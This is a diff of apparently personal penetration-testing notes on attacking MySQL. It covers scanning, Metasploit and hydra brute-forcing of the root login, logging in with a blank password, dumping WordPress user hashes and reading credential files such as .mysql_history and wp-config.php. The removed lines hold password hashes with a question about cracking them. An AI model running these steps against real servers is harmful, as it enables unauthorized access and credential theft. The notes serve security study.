@@ -9,64 +9,69 @@ nmap -Pn -sV -sC -p3306 <ip>
 ```
 searchsploit MySQL <version>
 ```
+```
+search MySQL <version>
+```
 
 - Check MySQL version.
 ```
 use auxiliary/scanner/mysql/mysql_version
 ```
 
-- Brute-force MySQL login using MSF.
+- Brute-force MySQL login.
   - Focus on root as other accounts may not have sufficient privileges for our intent.
   - root password can be NULL.
+  - hydra does not attempt NULL password?
 ```
 use auxiliary/scanner/mysql/mysql_login
 set USERNAME root
 set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
 set VERBOSE false
 ```
-
-- Brute-force MySQL login using hydra.
 ```
 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql
 ```
 
 - Brute-forcing can result in host being blocked.
-  - Need pre-existing shell access to target and a MySQL account to run `mysqladmin flush-hosts`.
-  - In general, avoid brute-forcing MySQL. Can test for NULL credentials manually.
+  - Need shell on target and MySQL account to run `mysqladmin flush-hosts`.
+  - Avoid brute-forcing MySQL? Test for NULL credentials manually.
 ```
 [ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
 ```
 
-- Connect to MySQL.
+- Connect to MySQL remotely.
   - Press Enter for password if NULL.
 ```
 mysql -u root -p -h <ip>
 ```
 
+- Basic SQL commands.
 ```
 show databases;
 use <database>;
 show tables;
 select * from <table>;
+```
 
+- Check Web app database for hashed user credentials e.g. WordPress.
+```
 use wordpress;
 select * from wp_users;
-
-# Web app user info in the database.
 ```
 
+- Check users' mysql history file for credentials and other information.
 ```
 cat ~/.mysql_history
-
-# History file may contain credentials.
 ```
 
-##
+- Check Web app config file for MySQL root password e.g. WordPress (WAMP).
+  - Requires admin privileges.
 ```
-$P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
-$P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/
+meterpreter > cat C:\\wamp\\www\\wordpress\\wp-config.php
 
-Salt: G*=2"S^\529h#r7Y=aPP (from nmap scan)
+/** MySQL database username */
+define('DB_USER', 'root');
 
-# How to crack?
+/** MySQL database password */
+define('DB_PASSWORD', '');
 ```
